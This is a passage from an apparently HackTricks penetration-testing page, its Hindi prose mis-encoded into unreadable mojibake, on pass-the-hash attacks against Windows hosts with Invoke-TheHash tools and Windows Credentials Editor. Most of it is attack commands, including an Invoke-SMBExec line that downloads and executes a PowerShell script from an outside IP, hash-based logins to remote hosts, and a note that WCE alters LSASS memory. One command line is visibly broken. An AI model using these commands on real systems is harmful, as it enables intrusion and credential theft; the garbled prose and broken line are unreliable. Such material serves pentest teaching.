Invoke-WMIExec -Target 192.168.1.100 -Username Administrator -Password P@ssw0rd
```

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рд╣рдо рд╡рд┐рдВрдбреЛрдЬ рд╕рд┐рд╕реНрдЯрдо 192.168.1.100 рдкрд░ рдПрдирдЯреАрдПрд▓рдПрдо рдПрдХреНрд╕реЗрдХреНрдпреВрд╢рди рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `Invoke-WMIExec` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВред рдпрд╣рд╛рдВ, `Administrator` рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ `P@ssw0rd` рдкрд╛рд╕рд╡рд░реНрдб рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рд╣реЛ рд░рд╣реЗ рд╣реИрдВред
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### рдЗрдиреНрд╡реЛрдХ-рдПрд╕рдПрдордмреАрдХреНрд▓рд╛рдЗрдВрдЯ

```powershell
Invoke-SMBClient -Target <target> -Username <username> -Password <password> -Command <command>
```

рдпрд╣ рдЖрджреЗрд╢ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ SMB рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд▓рдХреНрд╖реНрдп рдХреЗ рд╕рд╛рде рд╕рдВрдЪрд╛рд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдЖрдкрдХреЛ SMB рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рдлрд╝рд╛рдЗрд▓ рд╕рдВрдЪрд╛рд░, рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдФрд░ рдЕрдиреНрдп рд╕рдВрдЪрд╛рд░ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЖрдкрдХреЛ рд▓рдХреНрд╖реНрдп рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо, рдкрд╛рд╕рд╡рд░реНрдб рдФрд░ рдЖрджреЗрд╢ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
```
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### рдЗрдиреНрд╡реЛрдХ-рдПрд╕рдПрдордмреАрдИрдирдо

```plaintext
Invoke-SMBEnum is a PowerShell script that can be used to enumerate information from SMB services. It can be used to gather information such as user accounts, shares, and sessions from remote SMB servers.

Usage:
Invoke-SMBEnum -Target <target> [-Port <port>] [-Credential <credential>] [-Verbose]

Parameters:
- Target: The IP address or hostname of the target SMB server.
- Port: The port number on which the SMB service is running (default is 445).
- Credential: The credentials to use for authentication (optional).
- Verbose: Enable verbose output (optional).

Example:
Invoke-SMBEnum -Target 192.168.1.100 -Credential (Get-Credential)
```

рдЗрдиреНрд╡реЛрдХ-рдПрд╕рдПрдордмреАрдИрдирдо рдПрдХ рдкрд╛рд╡рд░рд╢реЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрд╕рдПрдордмреА рд╕реЗрд╡рд╛рдУрдВ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рд░реВрдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рджреВрд░рд╕реНрде рдПрд╕рдПрдордмреА рд╕рд░реНрд╡рд░ рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ, рд╕рд╛рдЭрд╛ рдФрд░ рд╕рддреНрд░ рдЬреИрд╕реА рдЬрд╛рдирдХрд╛рд░реА рдЗрдХрдЯреНрдард╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЙрдкрдпреЛрдЧ:
Invoke-SMBEnum -Target <target> [-Port <port>] [-Credential <credential>] [-Verbose]

рдкреИрд░рд╛рдореАрдЯрд░:
- Target: рд▓рдХреНрд╖рд┐рдд рдПрд╕рдПрдордмреА рд╕рд░реНрд╡рд░ рдХрд╛ рдЖрдИрдкреА рдкрддрд╛ рдпрд╛ рд╣реЛрд╕реНрдЯрдирд╛рдоред
- Port: рдПрд╕рдПрдордмреА рд╕реЗрд╡рд╛ рдЪрд▓ рд░рд╣реА рд╣реИ рдЙрд╕ рдкреЛрд░реНрдЯ рдирдВрдмрд░ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ 445)ред
- Credential: рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ (рд╡реИрдХрд▓реНрдкрд┐рдХ)ред
- Verbose: рд╡рд░реНрдмреЛрд╕ рдЖрдЙрдЯрдкреБрдЯ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ (рд╡реИрдХрд▓реНрдкрд┐рдХ)ред

рдЙрджрд╛рд╣рд░рдг:
Invoke-SMBEnum -Target 192.168.1.100 -Credential (Get-Credential)
```
```
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

рдпрд╣ рдлрд╝рдВрдХреНрд╢рди **рдЕрдиреНрдп рд╕рднреА** рдХрд╛ **рдорд┐рд╢реНрд░рдг рд╣реИ**ред рдЖрдк **рдХрдИ рд╣реЛрд╕реНрдЯ** рдХреЛ **рдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдХрд┐рд╕реА рдХреЛ **рдЫреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдЖрдкрдХреЛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд╡рд┐рдХрд▓реНрдк** рдХрд╛ **рдЪрдпрди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (_SMBExec, WMIExec, SMBClient, SMBEnum_)ред рдпрджрд┐ рдЖрдк **SMBExec** рдФрд░ **WMIExec** рдореЗрдВ рд╕реЗ **рдХрд┐рд╕реА рднреА** рдХрд╛ рдЪрдпрди рдХрд░рддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдк **рдХреЛрдИ** _**Command**_ рдкреИрд░рд╛рдореАрдЯрд░ рдирд╣реАрдВ рджреЗрддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдХреЗрд╡рд▓ рдпрд╣ **рдЬрд╛рдВрдЪреЗрдЧрд╛** рдХрд┐ рдХреНрдпрд╛ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реИрдВред
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [рдИрд╡рд┐рд▓-рд╡рд┐рдирдЖрд░рдПрдо рдкрд╛рд╕ рдж рд╣реИрд╢](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### рд╡рд┐рдВрдбреЛрдЬ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╕рдВрдкрд╛рджрдХ (рдбрдмреНрд▓реНрдпреВрд╕реАрдИ)

**рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**

рдпрд╣ рдЯреВрд▓ mimikatz рдХреА рддрд░рд╣реА рдХрд╛рдо рдХрд░реЗрдЧрд╛ (рдПрд▓рдПрд╕рдПрд╕ рдореЗрдореЛрд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдЧрд╛)ред
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде рдореИрдиреБрдЕрд▓ Windows рд░рд┐рдореЛрдЯ рдирд┐рд╖реНрдкрд╛рджрди

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## рдПрдХ Windows рд╣реЛрд╕реНрдЯ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдирд┐рдХрд╛рд▓рдирд╛

**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП** [**рдПрдХ Windows рд╣реЛрд╕реНрдЯ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЖрдкрдХреЛ рдЗрд╕ рдкреЗрдЬ рдХреЛ рдкрдврд╝рдирд╛ рдЪрд╛рд╣рд┐рдП**](broken-reference)**.**

## NTLM рд░рд┐рд▓реЗ рдФрд░ рд░рд┐рд╕реНрдкреЙрдиреНрдбрд░

**рдЗрди рд╣рдорд▓реЛрдВ рдХреЛ рдХреИрд╕реЗ рдХрд░реЗрдВ, рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рдЧрд╛рдЗрдб рдкрдврд╝реЗрдВ:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## рдиреЗрдЯрд╡рд░реНрдХ рдХреИрдкреНрдЪрд░ рд╕реЗ NTLM рдЪреБрдиреМрддрд┐рдпреЛрдВ рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░реЗрдВ

**рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ**? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ рд╣рдореЗрдВ PR рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред**

</details>
